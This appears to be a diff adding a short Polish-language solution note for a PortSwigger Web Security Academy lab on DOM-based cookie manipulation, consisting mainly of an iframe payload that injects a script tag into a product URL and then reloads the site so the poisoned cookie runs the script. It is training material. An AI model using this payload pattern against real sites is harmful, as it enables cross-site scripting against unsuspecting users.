@@ -1,0 +1,6 @@
+Payload zaladuje na chwile nasze cookie do przegladarki po czym nastapi przekierowanie i wykona sie nasz kod.
+
+<iframe src="https://0a2b00da03079486c0cdcb870093008a.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://0a2b00da03079486c0cdcb870093008a.web-security-academy.net';window.x=1;">
+
+
+(https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation)
